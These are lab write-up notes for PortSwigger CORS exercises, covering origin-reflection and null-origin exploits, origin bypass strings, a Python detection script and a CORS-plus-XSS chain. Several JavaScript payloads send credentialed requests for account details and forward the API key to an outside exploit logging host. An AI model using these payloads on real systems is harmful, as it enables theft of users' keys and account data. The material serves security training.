# CORS Attack Techniques

## PortSwigger Lab Solutions

### Lab 1: Basic origin reflection
```
Origin: https://evil.com
# Server reflects back
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

**Exploit**:
```html
<script>
var req = new XMLHttpRequest();
req.onload = function() {
  location = "https://exploit/log?key=" + this.responseText;
};
req.open("get", "https://TARGET/accountDetails", true);
req.withCredentials = true;
req.send();
</script>
```

### Lab 2: Trusted null origin
```html
<iframe sandbox="allow-scripts" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = function() { parent.location='https://exploit/log?'+this.responseText; };
req.open('get','https://TARGET/accountDetails',true);
req.withCredentials=true;
req.send();
</script>"></iframe>
```

### Lab 3: Insecure protocol trust
```
Origin: http://subdomain.TARGET.com
# Server trusts HTTP origins
```

## Bypass Techniques

### Subdomain matching
```
Origin: https://evil.TARGET.com
```

### null Origin
```
Origin: null
```

### Special chars
```
Origin: https://TARGET.com@evil.com
Origin: https://TARGET.com#.evil.com
```

## Detection Script
```python
import requests
target = "https://TARGET/accountDetails"
for origin in ["https://evil.com", "null", "http://evil.TARGET.com"]:
    r = requests.get(target, headers={"Origin": origin})
    if r.headers.get("Access-Control-Allow-Origin") == origin:
        print(f"VULNERABLE: {origin}")
```

## Verified Lab Solution: CORS + XSS Chain Attack

**Lab #42** - SOLVED 2026-07-07

### Attack Chain: HTTP Subdomain XSS + CORS Trust
1. **CORS Misconfig**: Server trusts all subdomains regardless of protocol
2. **XSS on HTTP subdomain**: `http://stock.TARGET/?productId=4<script>...`
3. **CORS Request**: XSS makes XHR to `https://TARGET/accountDetails` with credentials
4. **Exfiltration**: API key sent to exploit server

### Exploit HTML
```html
<script>
document.location="http://stock.TARGET/?productId=4<script>var req=new XMLHttpRequest();req.onload=function(){location='https://EXPLOIT/log?key='+this.responseText};req.open('get','https://TARGET/accountDetails',true);req.withCredentials=true;req.send();<\/script>&storeId=1";
</script>
```

### Key Lessons
- CORS trusting HTTP subdomains = XSS → credential theft
- Always check for XSS on subdomains when CORS trusts *.domain
- HTTP protocol downgrade attacks are still viable on internal subdomains
